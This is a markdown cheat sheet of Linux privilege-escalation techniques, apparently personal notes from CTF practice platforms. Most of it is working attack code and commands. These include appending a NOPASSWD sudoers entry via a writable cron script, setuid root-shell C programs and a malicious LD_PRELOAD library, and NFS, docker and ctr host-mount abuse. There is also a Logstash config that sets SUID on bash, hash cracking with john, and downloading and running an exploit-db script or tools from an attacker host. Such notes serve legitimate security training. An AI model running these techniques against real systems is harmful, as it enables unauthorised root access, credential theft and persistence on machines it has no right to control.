# Linux Privilege Escalation

> Personal notes built through CTF machines on HTB and TryHackMe.  
> These are real techniques that worked on real machines — not copy-paste from a course.

---

## Some Tools

- **LinPeas**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- **LinEnum:** https://github.com/rebootuser/LinEnum
- **LES (Linux Exploit Suggester):** https://github.com/mzet-/linux-exploit-suggester
- **Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration
- **Linux Priv Checker:** https://github.com/linted/linuxprivchecker

[Reverse Shell Generator](https://www.revshells.com/)  
[GTFOBins](https://gtfobins.github.io/)

---

## Cron Jobs

> Always check cron jobs early — if a script runs as root and you can write to it, game over.

### 1. System-Wide Cron Jobs

```bash
# Check the main cron file
cat /etc/crontab

# List cron jobs in /etc/cron.d/
ls -la /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null

# Check cron directories (hourly, daily, weekly, monthly)
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

### 2. User-Specific Cron Jobs

```bash
# Check crontabs for all users (requires root)
ls -la /var/spool/cron/crontabs/

# If you have sudo access:
sudo crontab -l -u root      # Check root's cron jobs
sudo crontab -l -u ross      # Check a specific user's cron jobs
```

### 3. Systemd Timers (Alternative to Cron)

```bash
# List all active timers
systemctl list-timers --all

# Search for a specific service timer
systemctl list-timers | grep -i 'postfix\|monitor'
```

### 4. Log Analysis

```bash
# Check cron execution history
grep CRON /var/log/syslog
grep cron /var/log/syslog
```

### Exploit: Add current user to sudoers via writable cron script

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

# Change "student" to your current username
```

---

## Crack Hashes

```bash
echo "hash_from_etc_shadow" > shadow.txt
echo "passwd_user_line" > passwd.txt

unshadow passwd.txt shadow.txt > unshadow.txt

sudo john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
```

---

## Find SUID Binaries

> SUID binaries run as their owner (often root) regardless of who executes them. Check GTFOBins for exploitation.

```bash
find / -perm -u=s -type f 2>/dev/null

find / -user root -perm /4000
```

> If `enlightenment_sys` exists → exploit with [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh)

---

## Capabilities

> Some binaries have Linux capabilities set instead of full SUID. `cap_setuid+ep` is the one you want.

```bash
getcap -r / 2>/dev/null

# Look for cap_setuid+ep in the output
# Then check GTFOBins for that binary
```

---

## Network File Sharing (NFS)

> If `no_root_squash` is set on a writable share — you can create a SUID binary from your attacker machine.

```bash
# On victim machine - check exports
cat /etc/exports

# On attacker machine - find mountable shares
showmount -e <TARGET_IP>

# Mount the share
mkdir /tmp/anything
mount -o rw <TARGET_IP>:/backups /tmp/anything

# Create SUID binary
nano /tmp/anything/exploit.c
```

```c
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc exploit.c -o exploit -w
chmod +s exploit

# Now run it on the victim machine
/tmp/anything/exploit
```

---

## Some Tricks

```bash
# List all users cleanly
cat /etc/passwd | cut -d ":" -f 1

# Find directories you can write to
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# Change PATH to /tmp (useful for PATH hijacking)
export PATH=/tmp:$PATH
```

---

## C Code to Open Root Shell

```c
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc exploit.c -o exploit -w
chmod +s exploit
./exploit
```

---

## Serve Files to Victim Machine

```bash
# On attacker machine
sudo python3 -m http.server 80

# On victim machine
wget http://<ATTACKER_IP>/linpeas.sh
# OR
curl http://<ATTACKER_IP>/linpeas.sh -o linpeas.sh
```

---

## Stable Shell (Python pty)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

# If python is not installed
/bin/script -qc /bin/bash /dev/null
```

---

## LD_PRELOAD

> Works when `sudo -l` shows `env_keep+=LD_PRELOAD` for any command you can run with sudo.

```bash
# First check
sudo -l
# Look for: env_keep+=LD_PRELOAD

# Create the malicious shared library
cd /tmp
nano shell.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Run any command you have sudo rights on with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so find
```

---

## screen-4.5.0 Binary Exploit

> [GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)

### How to know the system is vulnerable

```bash
# Check the screen version
screen --version
# Vulnerable if it returns: Screen version 4.05.00 (GNU) 10-Dec-16

# Find the binary
find / -name "screen" 2>/dev/null
```

### Confirm SUID bit is set (required for the exploit to work)

```bash
ls -la /usr/bin/screen
# Look for: -rwsr-xr-x
# The 's' means SUID is set — without it this exploit won't work
```

### When to look for this

- LinPEAS highlights screen under SUID binaries
- `find / -perm -u=s -type f 2>/dev/null` shows `/usr/bin/screen`
- The machine feels old — this CVE is from 2017

### Exploit

```bash
# Download and run the exploit script
wget https://www.exploit-db.com/raw/41154 -O screen_exploit.sh
chmod +x screen_exploit.sh
./screen_exploit.sh
```

The exploit abuses screen's logging feature which runs as root due to the SUID bit. It tricks screen into creating a root-owned shared library, then loads it to get a root shell.

---

## Docker Group

> If your user is in the docker group — instant root. No exploit needed.

```bash
# Check available images
docker images

# Mount the whole filesystem into a container and chroot into it
docker run -v /:/mnt --rm -it <image_name> chroot /mnt bash
```

---

## Containerd (ctr) with NOPASSWD sudo

```bash
# Example from a machine where jasmine could run ctr as root:
# (ALL) NOPASSWD: /usr/bin/ctr

sudo ctr image list

# Create mount point
mkdir /tmp/host

# Mount host filesystem into container and read root files
sudo ctr run --rm --mount "type=bind,src=/,dst=/host,options=rbind" docker.io/library/alpine:latest readflag sh -c "cat /host/root/flag.txt"
```

> [HackTricks - ctr Privilege Escalation](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation)

---

## Logstash

> Works when Logstash runs as root and you have write permission on a pipeline config.

```bash
# Check if Logstash exists
ls -all /etc/logstash/pipelines.yml

# Check if Logstash is running as a high privilege user
ps aux | grep logstash

# YOU NEED WRITE PERMISSION ON ONE OF THESE
ls -all /etc/logstash/pipelines.yml
ls -all /etc/logstash/conf.d

# Create a malicious pipeline config
nano /etc/logstash/conf.d/pwn.conf
```

```ruby
input {
  exec {
    command => "chmod u+s /bin/bash"
    interval => 60
  }
}

output {
  file {
    path => "/tmp/pwned.log"
    codec => rubydebug
  }
}
```

```bash
# Wait ~60 seconds then
/bin/bash -p
# BOOM — root shell
```

> [HackTricks - Logstash](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/logstash)

---

## References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Reverse Shell Cheat Sheet](https://gist.github.com/sckalath/67a59eb4955f1f9aedde)
- [Exploit-DB](https://www.exploit-db.com/)
